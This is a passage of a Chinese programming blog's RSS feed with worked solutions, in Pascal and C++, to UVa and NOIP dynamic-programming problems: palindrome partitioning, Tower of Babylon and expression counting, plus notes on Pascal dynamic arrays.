assign(input, <span class="hljs-string">&#x27;main.in&#x27;</span>);reset(input);</span><br><span class="line">    assign(output,<span class="hljs-string">&#x27;main.out&#x27;</span>);rewrite(output);</span><br><span class="line">    readln(n, T);</span><br><span class="line">    <span class="hljs-keyword">while</span> n&gt;<span class="hljs-number">0</span> <span class="hljs-keyword">do</span></span><br><span class="line">    <span class="hljs-keyword">begin</span></span><br><span class="line">        fillchar(f, sizeof(f), <span class="hljs-number">0</span>);</span><br><span class="line">        fillchar(tree, sizeof(tree), <span class="hljs-number">0</span>);</span><br><span class="line">        <span class="hljs-keyword">for</span> i := <span class="hljs-number">1</span> <span class="hljs-keyword">to</span> n <span class="hljs-keyword">do</span></span><br><span class="line">        <span class="hljs-keyword">begin</span></span><br><span class="line">            <span class="hljs-keyword">read</span>(x);</span><br><span class="line">            SetLength(tree[x], length(tree[x])+<span class="hljs-number">1</span>);</span><br><span class="line">            tree[x][high(tree[x])] := i;</span><br><span class="line">        <span class="hljs-keyword">end</span>;</span><br><span class="line">        readln;</span><br><span class="line">        dp(<span class="hljs-number">0</span>);</span><br><span class="line">        writeln(f[<span class="hljs-number">0</span>]);</span><br><span class="line">        readln(n, T);</span><br><span class="line">    <span class="hljs-keyword">end</span>;</span><br><span class="line">    close(input); close(output);</span><br><span class="line"><span class="hljs-keyword">end</span>.</span><br></pre></div></div><h2 id="dynamic-arrays">Dynamic Arrays</h2><p  class="noindent"> 这里，再总结一下动态数组的用法。</p><ol><li>定义：<code>a: array of [type];</code></li><li>设置长度： <code>SetLength(a, 10);</code></li><li>长度加一： <code>SetLength(a, Length(a)+1);</code></li><li>取得最大、最小下标： <code>High(a)</code>, <code>Low(a)</code></li></ol><p  class="par"> 事实上，从 <a href="http://freepascal.org/docs-html/ref/refsu18.html#x42-480003.3.1">1.1</a> 版本开始 FPC 就支持 Dynamic Arrays 了。所以在 NOIP 竞赛中我们大可放心使用。</p>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Tech/">Tech</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/UVa/">UVa</category>
      
      <category domain="https://i.hsfzxjy.site/tags/NOIP/">NOIP</category>
      
      
      <comments>https://i.hsfzxjy.site/uva12186-another-crisis-dynamic-arrays-in-pascal/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>UVa11584 Partitioning by Palindromes</title>
      <link>https://i.hsfzxjy.site/uva-11584-partitioning-by-palindromes/</link>
      <guid>https://i.hsfzxjy.site/uva-11584-partitioning-by-palindromes/</guid>
      <pubDate>Wed, 24 Sep 2014 06:00:14 GMT</pubDate>
      
        
        
      <description>&lt;blockquote&gt;
&lt;p  class=&quot;noindent&quot;&gt; 这是一道区间型 DP，转移方程很简单，但在实现的过程中却遇见了很多坑，在此记录一下。链接：&lt;a href=&quot;http://uva.onlinejudge.org/index.php?option=com_onl</description>
        
      
      
      
      <content:encoded><![CDATA[<blockquote><p  class="noindent"> 这是一道区间型 DP，转移方程很简单，但在实现的过程中却遇见了很多坑，在此记录一下。链接：<a href="http://uva.onlinejudge.org/index.php?option=com_onlinejudge&Itemid=8&page=show_problem&category=27&problem=2631&mosmsg=Submission%20received%20with%20ID%2014256745%22">Link</a> 耗时：0.368s</p></blockquote><p >容易想到，前 $i$ 个数的划分情况可以由 $1,2,3,\ldots,i-1$ 的划分情况来决定。因此很容易得到状态转移方程：</p><p >$$d[i] = min(d[i], d[j]+1)$$</p><p  class="par"> 其中 $j = 0, 1, 2,\ldots,n-1$ 并且 $s[j+1, i]$ 为回文串，初始条件：$d[i] = i$。$d[i]$ 表示前 i 项的最小划分。这样一来状态转移的复杂度就为 $O(n^2)$。</p><p >但状态转移的判断呢？“回文串”是一个复杂的条件，判断一个串是否为回文串需要将该串至少遍历一遍。这样一来时间复杂度就上升为 $O(n^3)$ 了。而事实上在这种算法中有许多无谓的计算，因此我们可以先对字符串进行预处理：用 <code>huiwen[i,j]</code> 表示 $s[i,j]$ 是否为回文串（奇怪的名字。。。）。如此一来，时间复杂度就降为 $O(n^2)$ 了。</p><div class="gk-code hljs" data-gk-id="BLOCK1"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">var</span></span><br><span class="line">    s: AnsiString;</span><br><span class="line">    n, _, i, j, l: integer;</span><br><span class="line">    huiwen: <span class="hljs-keyword">array</span> [<span class="hljs-number">1</span>..<span class="hljs-number">1000</span>, <span class="hljs-number">1</span>..<span class="hljs-number">1000</span>] <span class="hljs-keyword">of</span> boolean; <span class="hljs-comment">//s[i,j]是否为回文串</span></span><br><span class="line">    dp: <span class="hljs-keyword">array</span> [<span class="hljs-number">0</span>..<span class="hljs-number">1000</span>] <span class="hljs-keyword">of</span> integer; <span class="hljs-comment">//一定从0开始，否则当整串为回文串时就考虑不到了。</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">min</span><span class="hljs-params">(x,y: integer)</span>:</span> integer;</span><br><span class="line"><span class="hljs-keyword">begin</span></span><br><span class="line">    <span class="hljs-keyword">if</span> x&lt;y <span class="hljs-keyword">then</span> <span class="hljs-keyword">exit</span>(x) <span class="hljs-keyword">else</span> <span class="hljs-keyword">exit</span>(y);</span><br><span class="line"><span class="hljs-keyword">end</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">procedure</span> <span class="hljs-title">process</span><span class="hljs-params">(i,j: integer)</span>;</span> <span class="hljs-comment">//对回文串进行预处理</span></span><br><span class="line"><span class="hljs-keyword">var</span></span><br><span class="line">    mid: Integer;</span><br><span class="line">    x,y: integer;</span><br><span class="line"><span class="hljs-keyword">begin</span></span><br><span class="line">    <span class="hljs-keyword">if</span> j = i <span class="hljs-keyword">then</span></span><br><span class="line">    <span class="hljs-keyword">begin</span></span><br><span class="line">        huiwen[i,j] := true;</span><br><span class="line">        <span class="hljs-keyword">exit</span>;</span><br><span class="line">    <span class="hljs-keyword">end</span>;</span><br><span class="line">    mid := i + (j-i+<span class="hljs-number">1</span>) <span class="hljs-keyword">shr</span> <span class="hljs-number">1</span>;</span><br><span class="line">    x := i;</span><br><span class="line">    y := j;</span><br><span class="line">    <span class="hljs-keyword">while</span> (x &lt;= mid) <span class="hljs-keyword">and</span> (s[x] = s[y]) <span class="hljs-keyword">do</span></span><br><span class="line">    <span class="hljs-keyword">begin</span></span><br><span class="line">        inc(x);</span><br><span class="line">        dec(y);</span><br><span class="line">    <span class="hljs-keyword">end</span>;</span><br><span class="line">    huiwen[i, j] := x &gt; mid;</span><br><span class="line"><span class="hljs-keyword">end</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">begin</span></span><br><span class="line">    <span class="hljs-comment">//assign(input, &#x27;main.in&#x27;); reset(input);</span></span><br><span class="line">    <span class="hljs-comment">//assign(output, &#x27;main.out&#x27;); rewrite(output);</span></span><br><span class="line">    readln(n);</span><br><span class="line">    <span class="hljs-keyword">for</span> _ := <span class="hljs-number">1</span> <span class="hljs-keyword">to</span> n <span class="hljs-keyword">do</span></span><br><span class="line">    <span class="hljs-keyword">begin</span></span><br><span class="line">        readln(s);</span><br><span class="line">        l := length(s);</span><br><span class="line">        <span class="hljs-comment">//Pre-process</span></span><br><span class="line">        fillchar(huiwen, sizeof(huiwen), <span class="hljs-number">0</span>);</span><br><span class="line">        <span class="hljs-keyword">for</span> i := <span class="hljs-number">1</span> <span class="hljs-keyword">to</span> l <span class="hljs-keyword">do</span></span><br><span class="line">            <span class="hljs-keyword">for</span> j := i <span class="hljs-keyword">to</span> l <span class="hljs-keyword">do</span> <span class="hljs-comment">//一定是从i开始，这个错卡了我很久。</span></span><br><span class="line">                process(i, j);</span><br><span class="line">        <span class="hljs-comment">//DP</span></span><br><span class="line">        <span class="hljs-keyword">for</span> i := <span class="hljs-number">1</span> <span class="hljs-keyword">to</span> l <span class="hljs-keyword">do</span></span><br><span class="line">        <span class="hljs-keyword">begin</span></span><br><span class="line">            dp[i] := i;</span><br><span class="line">            <span class="hljs-keyword">for</span> j := <span class="hljs-number">0</span> <span class="hljs-keyword">to</span> i-<span class="hljs-number">1</span> <span class="hljs-keyword">do</span></span><br><span class="line">                <span class="hljs-keyword">if</span> huiwen[j+<span class="hljs-number">1</span>, i] <span class="hljs-keyword">then</span></span><br><span class="line">                    dp[i] := min(dp[i], dp[j]+<span class="hljs-number">1</span>);</span><br><span class="line">        <span class="hljs-keyword">end</span>;</span><br><span class="line">        <span class="hljs-keyword">write</span>(dp[l]);</span><br><span class="line">        <span class="hljs-comment">{if _ &lt;&gt;n then }</span>writeln; <span class="hljs-comment">//吐槽一下：一开始我还谨慎地加上这句以避免行末回车，没想到UVa居然报错了。。看来UVa的比较算法还有待改进啊。</span></span><br><span class="line">    <span class="hljs-keyword">end</span>;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-comment">//close(input);close(output);</span></span><br><span class="line"><span class="hljs-keyword">end</span>.</span><br></pre></div></div>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Tech/">Tech</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/UVa/">UVa</category>
      
      <category domain="https://i.hsfzxjy.site/tags/NOIP/">NOIP</category>
      
      
      <comments>https://i.hsfzxjy.site/uva-11584-partitioning-by-palindromes/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>UVa437 The Tower of Babylon</title>
      <link>https://i.hsfzxjy.site/uva437-the-tower-of-babylon/</link>
      <guid>https://i.hsfzxjy.site/uva437-the-tower-of-babylon/</guid>
      <pubDate>Tue, 23 Sep 2014 06:00:56 GMT</pubDate>
      
        
        
      <description>&lt;blockquote&gt;
&lt;p  class=&quot;noindent&quot;&gt; 链接：&lt;a href=&quot;http://uva.onlinejudge.org/index.php?option=com_onlinejudge&amp;Itemid=8&amp;category=6&amp;page=show_pro</description>
        
      
      
      
      <content:encoded><![CDATA[<blockquote><p  class="noindent"> 链接：<a href="http://uva.onlinejudge.org/index.php?option=com_onlinejudge&Itemid=8&category=6&page=show_problem&problem=378">The Tower of Babylon</a> 耗时：0.015s</p></blockquote><p >这是刘汝佳的紫书中”DAG 中的动态规划”中的习题，我拿它用来熟悉 DAG 中的动态规划。</p><p >我们不妨进行逆向考虑：现堆上面的方块，然后考虑在下面进行叠加。这样子一来，影响决策的就只是最下面方块的尺寸了。</p><p >对于这种出现了”大套小”这样的二元关系的题，我们可以将其视为一个有向无环图：<strong>其中每个节点为一个状态，状态的转移是有固定的方向的</strong>（在此题中，状态转移为从小的方块到大的方块）。</p><p >但是这道题又不同于平常的 DAG 动态规划：若将边长视为状态的话，则要开一个巨大的数组，这是不可以接受的。因此，我们要换一种思维方式：只记录方块的序号和摆放的方式（如现将边长从小到大进行排序，然后用一个标志 k 表示当前是以第 k 小的边长作为高）。</p><p >至此，思路已经清晰了。用 $dp(i, k)$ 表示 <strong>“第 i 个方块以第 k 条边为高进行摆放”</strong> ，以下给出状态转移方程：</p><p >$$dp(i, k) = max\{dp(i, k), dp(j, k_2)\}$$</p><p  class="par"> 其中 $j，k_2$ 遍历所有顶面矩形比 $dp(i, k)$ 小的状态。</p><p >代码实现首次尝试了 Pascal 中的 object 类型，使其更加工整，但不可避免地损耗了一些性能。</p><div class="gk-code hljs" data-gk-id="BLOCK1"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">type</span></span><br><span class="line">    Cube = <span class="hljs-keyword">object</span></span><br><span class="line">        a: <span class="hljs-keyword">array</span> [<span class="hljs-number">1</span>..<span class="hljs-number">3</span>] <span class="hljs-keyword">of</span> longint;</span><br><span class="line">        <span class="hljs-function"><span class="hljs-keyword">procedure</span> <span class="hljs-title">init</span><span class="hljs-params">(x,y,z: longint)</span>;</span></span><br><span class="line">        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">height</span><span class="hljs-params">(k: integer)</span>:</span> longint;</span><br><span class="line">        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">low</span><span class="hljs-params">(k: integer)</span>:</span> longint;</span><br><span class="line">        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">high</span><span class="hljs-params">(k: integer)</span>:</span> longint;</span><br><span class="line">    <span class="hljs-keyword">end</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">max</span><span class="hljs-params">(x,y: longint)</span>:</span> longint;</span><br><span class="line"><span class="hljs-keyword">begin</span></span><br><span class="line">    <span class="hljs-keyword">if</span> x&gt;y <span class="hljs-keyword">then</span> max := x <span class="hljs-keyword">else</span> max := y;</span><br><span class="line"><span class="hljs-keyword">end</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">procedure</span> <span class="hljs-title">swap</span><span class="hljs-params">(<span class="hljs-keyword">var</span> x,y: longint)</span>;</span></span><br><span class="line"><span class="hljs-keyword">var</span></span><br><span class="line">    t: longint;</span><br><span class="line"><span class="hljs-keyword">begin</span></span><br><span class="line">    t := x;</span><br><span class="line">    x := y;</span><br><span class="line">    y := t;</span><br><span class="line"><span class="hljs-keyword">end</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Cube</span>.<span class="hljs-title">height</span><span class="hljs-params">(k: integer)</span>:</span> longint;</span><br><span class="line"><span class="hljs-keyword">begin</span></span><br><span class="line">    height := self.a[k];</span><br><span class="line"><span class="hljs-keyword">end</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Cube</span>.<span class="hljs-title">high</span><span class="hljs-params">(k: integer)</span>:</span> longint;</span><br><span class="line"><span class="hljs-keyword">begin</span></span><br><span class="line">    <span class="hljs-keyword">case</span> k <span class="hljs-keyword">of</span></span><br><span class="line">        <span class="hljs-number">1</span>: high := a[<span class="hljs-number">3</span>];</span><br><span class="line">        <span class="hljs-number">2</span>: high := a[<span class="hljs-number">3</span>];</span><br><span class="line">        <span class="hljs-number">3</span>: high := a[<span class="hljs-number">2</span>];</span><br><span class="line">    <span class="hljs-keyword">end</span>;</span><br><span class="line"><span class="hljs-keyword">end</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Cube</span>.<span class="hljs-title">low</span><span class="hljs-params">(k: integer)</span>:</span> longint;</span><br><span class="line"><span class="hljs-keyword">begin</span></span><br><span class="line">    <span class="hljs-keyword">case</span> k <span class="hljs-keyword">of</span></span><br><span class="line">        <span class="hljs-number">1</span>: low := a[<span class="hljs-number">2</span>];</span><br><span class="line">        <span class="hljs-number">2</span>,<span class="hljs-number">3</span>: low := a[<span class="hljs-number">1</span>];</span><br><span class="line">    <span class="hljs-keyword">end</span>;</span><br><span class="line"><span class="hljs-keyword">end</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">procedure</span> <span class="hljs-title">Cube</span>.<span class="hljs-title">init</span><span class="hljs-params">(x, y, z: longint)</span>;</span></span><br><span class="line"><span class="hljs-keyword">begin</span></span><br><span class="line">   <span class="hljs-keyword">if</span> x&gt;y <span class="hljs-keyword">then</span> swap(x,y);</span><br><span class="line">   <span class="hljs-keyword">if</span> y&gt;z <span class="hljs-keyword">then</span> swap(y,z);</span><br><span class="line">   <span class="hljs-keyword">if</span> x&gt;y <span class="hljs-keyword">then</span> swap(x,y);</span><br><span class="line">   a[<span class="hljs-number">1</span>] := x;</span><br><span class="line">   a[<span class="hljs-number">2</span>] := y;</span><br><span class="line">   a[<span class="hljs-number">3</span>] := z;</span><br><span class="line"><span class="hljs-keyword">end</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">var</span></span><br><span class="line">    f: <span class="hljs-keyword">array</span> [<span class="hljs-number">1</span>..<span class="hljs-number">30</span>, <span class="hljs-number">1</span>..<span class="hljs-number">3</span>] <span class="hljs-keyword">of</span> longint;</span><br><span class="line">    i,j,m,n,x,y,z: longint;</span><br><span class="line">    cnt: longint;</span><br><span class="line">    cubes: <span class="hljs-keyword">array</span> [<span class="hljs-number">1</span>..<span class="hljs-number">30</span>] <span class="hljs-keyword">of</span> Cube;</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">dp</span><span class="hljs-params">(id, k: integer)</span>:</span> longint;</span><br><span class="line"><span class="hljs-keyword">var</span></span><br><span class="line">    l, h, hi: longint;</span><br><span class="line">    i, j: integer;</span><br><span class="line"><span class="hljs-keyword">begin</span></span><br><span class="line">    <span class="hljs-keyword">if</span> f[id, k] &gt; <span class="hljs-number">0</span> <span class="hljs-keyword">then</span></span><br><span class="line">        <span class="hljs-keyword">exit</span>(f[id, k]);</span><br><span class="line">    l := cubes[id].low(k);</span><br><span class="line">    hi := cubes[id].height(k);</span><br><span class="line">    h := cubes[id].high(k);</span><br><span class="line"></span><br><span class="line">    f[id, k] := hi;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">for</span> i := <span class="hljs-number">1</span> <span class="hljs-keyword">to</span> n <span class="hljs-keyword">do</span></span><br><span class="line">    <span class="hljs-keyword">begin</span></span><br><span class="line">        <span class="hljs-comment">//if i = id then continue;  //此处在一开始时忘记考虑了立方体有无穷多个这一条件。</span></span><br><span class="line">        <span class="hljs-keyword">for</span> j := <span class="hljs-number">1</span> <span class="hljs-keyword">to</span> <span class="hljs-number">3</span> <span class="hljs-keyword">do</span></span><br><span class="line">        <span class="hljs-keyword">begin</span></span><br><span class="line">            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> ((cubes[i].low(j) &lt; l) <span class="hljs-keyword">and</span> (cubes[i].high(j) &lt; h)) <span class="hljs-keyword">then</span></span><br><span class="line">                <span class="hljs-keyword">continue</span>;</span><br><span class="line">            f[id, k] := max(f[id, k], dp(i, j)+hi);</span><br><span class="line">        <span class="hljs-keyword">end</span>;</span><br><span class="line">    <span class="hljs-keyword">end</span>;</span><br><span class="line"></span><br><span class="line">    dp := f[id, k];</span><br><span class="line"><span class="hljs-keyword">end</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">begin</span></span><br><span class="line">    assign(input, <span class="hljs-string">&#x27;main.in&#x27;</span>);reset(input);</span><br><span class="line">    assign(output, <span class="hljs-string">&#x27;main.out&#x27;</span>);rewrite(output);</span><br><span class="line">    <span class="hljs-keyword">read</span>(n);</span><br><span class="line">    cnt := <span class="hljs-number">0</span>;</span><br><span class="line">    <span class="hljs-keyword">while</span> n &gt; <span class="hljs-number">0</span> <span class="hljs-keyword">do</span></span><br><span class="line">    <span class="hljs-keyword">begin</span></span><br><span class="line">        inc(cnt);</span><br><span class="line">        <span class="hljs-keyword">for</span> i := <span class="hljs-number">1</span> <span class="hljs-keyword">to</span> n <span class="hljs-keyword">do</span></span><br><span class="line">        <span class="hljs-keyword">begin</span></span><br><span class="line">            <span class="hljs-keyword">read</span>(x,y,z);</span><br><span class="line">            cubes[i].init(x,y,z);</span><br><span class="line">        <span class="hljs-keyword">end</span>;</span><br><span class="line">        fillchar(f, sizeof(f), <span class="hljs-number">0</span>);</span><br><span class="line"></span><br><span class="line">        m := <span class="hljs-number">0</span>;</span><br><span class="line">        <span class="hljs-keyword">for</span> i := <span class="hljs-number">1</span> <span class="hljs-keyword">to</span> n <span class="hljs-keyword">do</span></span><br><span class="line">            <span class="hljs-keyword">for</span> j := <span class="hljs-number">1</span> <span class="hljs-keyword">to</span> <span class="hljs-number">3</span> <span class="hljs-keyword">do</span></span><br><span class="line">                m := max(m, dp(i, j));</span><br><span class="line"></span><br><span class="line">        writeln(<span class="hljs-string">&#x27;Case &#x27;</span>, cnt, <span class="hljs-string">&#x27;: maximum height = &#x27;</span>, m);</span><br><span class="line"></span><br><span class="line">        <span class="hljs-keyword">read</span>(n);</span><br><span class="line">    <span class="hljs-keyword">end</span>;</span><br><span class="line">    close(input);close(output);</span><br><span class="line"><span class="hljs-keyword">end</span>.</span><br></pre></div></div>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Tech/">Tech</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/UVa/">UVa</category>
      
      <category domain="https://i.hsfzxjy.site/tags/NOIP/">NOIP</category>
      
      
      <comments>https://i.hsfzxjy.site/uva437-the-tower-of-babylon/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>NOIP2011 表达式计算</title>
      <link>https://i.hsfzxjy.site/noip2011-expression/</link>
      <guid>https://i.hsfzxjy.site/noip2011-expression/</guid>
      <pubDate>Mon, 22 Sep 2014 05:57:50 GMT</pubDate>
      
        
        
      <description>&lt;blockquote&gt;
&lt;p  class=&quot;noindent&quot;&gt; 记得 11 年的时候，觉得这道题爆难，根本无从下手。三年后再次回顾，终于 AC 了，就当是对表达式求值和动态规划的复习吧。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p  class=&quot;noindent&quot;&gt; 题目：</description>
        
      
      
      
      <content:encoded><![CDATA[<blockquote><p  class="noindent"> 记得 11 年的时候，觉得这道题爆难，根本无从下手。三年后再次回顾，终于 AC 了，就当是对表达式求值和动态规划的复习吧。</p></blockquote><p  class="noindent"> 题目：<a href="http://codevs.cn/problem/1133/">Link</a></p><div class="gk-code hljs" data-gk-id="BLOCK1"><div class="gk-code-display"><pre><span class="line"><span class="hljs-comment">// Accepted.</span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-keyword">define</span> Mod 10007</span></span><br><span class="line"><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> {</span><br><span class="line">    <span class="hljs-type">long</span> <span class="hljs-type">long</span> v0;  <span class="hljs-comment">//当前值为 0 的个数</span></span><br><span class="line">    <span class="hljs-type">long</span> <span class="hljs-type">long</span> v1;  <span class="hljs-comment">//当前值为 1 的个数</span></span><br><span class="line">    <span class="hljs-type">char</span> ch;  <span class="hljs-comment">//当前字符</span></span><br><span class="line">} vertex;</span><br><span class="line"></span><br><span class="line">vertex f[<span class="hljs-number">100000</span>];</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">merge_sum</span><span class="hljs-params">(<span class="hljs-type">int</span> p)</span> </span>{</span><br><span class="line">    <span class="hljs-type">int</span> w0 = f[p<span class="hljs-number">-1</span>].v0 * f[p].v0;</span><br><span class="line">    <span class="hljs-type">int</span> w1 = f[p<span class="hljs-number">-1</span>].v0*f[p].v1+f[p<span class="hljs-number">-1</span>].v1*f[p].v0+f[p<span class="hljs-number">-1</span>].v1*f[p].v1;</span><br><span class="line">    f[p<span class="hljs-number">-1</span>].v0 = w0 % Mod;</span><br><span class="line">    f[p<span class="hljs-number">-1</span>].v1 = w1 % Mod;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title">merge_product</span><span class="hljs-params">(<span class="hljs-type">int</span> p)</span>  <span class="hljs-comment">//处理当前的值和前一个值取&#x27;*&#x27;的操作</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">       <span class="hljs-type">int</span> w0=f[p<span class="hljs-number">-1</span>].v0*f[p].v0+f[p<span class="hljs-number">-1</span>].v0*f[p].v1+f[p<span class="hljs-number">-1</span>].v1*f[p].v0;</span><br><span class="line">       <span class="hljs-type">int</span> w1=f[p<span class="hljs-number">-1</span>].v1*f[p].v1;</span><br><span class="line">       f[p<span class="hljs-number">-1</span>].v0=w0%Mod;</span><br><span class="line">       f[p<span class="hljs-number">-1</span>].v1=w1%Mod;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">    <span class="hljs-type">int</span> n;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    f[<span class="hljs-number">0</span>].v0=f[<span class="hljs-number">0</span>].v1=<span class="hljs-number">1</span>;</span><br><span class="line">    <span class="hljs-keyword">while</span> (n--)</span><br><span class="line">    {</span><br><span class="line">          now++;   <span class="hljs-comment">//新建一个空位读入新符号</span></span><br><span class="line">          cin&gt;&gt;f[now].ch;</span><br><span class="line">          f[now].v0=f[now].v1=<span class="hljs-number">1</span>;  <span class="hljs-comment">//初始化当前符号的前面的值 (虽然&#x27;)&#x27;除外，但也不影响)</span></span><br><span class="line">          <span class="hljs-keyword">if</span> (f[now].ch==<span class="hljs-string">&#x27;+&#x27;</span>)</span><br><span class="line">          {</span><br><span class="line">             <span class="hljs-keyword">if</span> (f[now<span class="hljs-number">-1</span>].ch==<span class="hljs-string">&#x27;*&#x27;</span>) <span class="hljs-comment">//处理&#x27;*&#x27;</span></span><br><span class="line">             {</span><br><span class="line">                now--;</span><br><span class="line">                <span class="hljs-built_in">merge_product</span>(now);</span><br><span class="line">                f[now]=f[now+<span class="hljs-number">1</span>];</span><br><span class="line">             }</span><br><span class="line">             <span class="hljs-keyword">if</span> (f[now<span class="hljs-number">-1</span>].ch==<span class="hljs-string">&#x27;+&#x27;</span>) <span class="hljs-comment">//处理&#x27;+&#x27;</span></span><br><span class="line">             {</span><br><span class="line">                now--;</span><br><span class="line">                <span class="hljs-built_in">merge_sum</span>(now);</span><br><span class="line">                f[now]=f[now+<span class="hljs-number">1</span>];</span><br><span class="line">             }</span><br><span class="line">          }</span><br><span class="line">          <span class="hljs-keyword">if</span> (f[now].ch==<span class="hljs-string">&#x27;*&#x27;</span>)</span><br><span class="line">           <span class="hljs-keyword">if</span> (f[now<span class="hljs-number">-1</span>].ch==<span class="hljs-string">&#x27;*&#x27;</span>) <span class="hljs-comment">//处理&#x27;*&#x27;</span></span><br><span class="line">           {</span><br><span class="line">              now--;</span><br><span class="line">              <span class="hljs-built_in">merge_product</span>(now);</span><br><span class="line">              f[now]=f[now+<span class="hljs-number">1</span>];</span><br><span class="line">           }</span><br><span class="line">          <span class="hljs-keyword">if</span> (f[now].ch==<span class="hljs-string">&#x27;)&#x27;</span>) <span class="hljs-comment">//处理&#x27;)&#x27;(比较麻烦)</span></span><br><span class="line">          {</span><br><span class="line">             now--;</span><br><span class="line">             <span class="hljs-keyword">if</span> (f[now].ch==<span class="hljs-string">&#x27;*&#x27;</span>)</span><br><span class="line">             {</span><br><span class="line">                <span class="hljs-built_in">merge_product</span>(now);</span><br><span class="line">                now--;</span><br><span class="line">             }</span><br><span class="line">             <span class="hljs-keyword">if</span> (f[now].ch==<span class="hljs-string">&#x27;+&#x27;</span>)</span><br><span class="line">             {</span><br><span class="line">                <span class="hljs-built_in">merge_sum</span>(now);</span><br><span class="line">                now--;</span><br><span class="line">             }</span><br><span class="line">             now--;</span><br><span class="line">             f[now].v0=f[now+<span class="hljs-number">1</span>].v0;</span><br><span class="line">             f[now].v1=f[now+<span class="hljs-number">1</span>].v1;</span><br><span class="line">             <span class="hljs-keyword">if</span> (f[now].ch==<span class="hljs-string">&#x27;*&#x27;</span>)</span><br><span class="line">             {</span><br><span class="line">                <span class="hljs-built_in">merge_product</span>(now);</span><br><span class="line">                now--;</span><br><span class="line">             }</span><br><span class="line">          }</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">if</span> (f[now].ch==<span class="hljs-string">&#x27;*&#x27;</span>)  <span class="hljs-comment">//处理完了以后，可能还有残留的&#x27;*&#x27;和&#x27;+&#x27;</span></span><br><span class="line">    {</span><br><span class="line">       <span class="hljs-built_in">merge_product</span>(now);</span><br><span class="line">       now--;</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">if</span> (f[now].ch==<span class="hljs-string">&#x27;+&#x27;</span>)</span><br><span class="line">    {</span><br><span class="line">       <span class="hljs-built_in">merge_sum</span>(now);</span><br><span class="line">       now--;</span><br><span class="line">    }</span><br><span class="line">    cout&lt;&lt;f[<span class="hljs-number">0</span>].v0;</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">}</span><br></pre></div></div>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Tech/">Tech</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/NOIP/">NOIP</category>
      
      
      <comments>https://i.hsfzxjy.site/noip2011-expression/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Extended 和 Double 的奇怪问题</title>
      <link>https://i.hsfzxjy.site/strange-extended-and-double-problem/</link>
      <guid>https://i.hsfzxjy.site/strange-extended-and-double-problem/</guid>
      <pubDate>Tue, 19 Aug 2014 21:37:46 GMT</pubDate>
      
        
        
      <description>&lt;p &gt;最近在做一个项目，其中有一段判断一个 &lt;code&gt;Extended&lt;/code&gt; 浮点数是否为整数的代码。我用如下方式实现：&lt;/p&gt;
&lt;div class=&quot;gk-code hljs&quot; data-gk-id=&quot;BLOCK1&quot;&gt;&lt;div class=&quot;gk-code-dis</description>
        
      
      
      
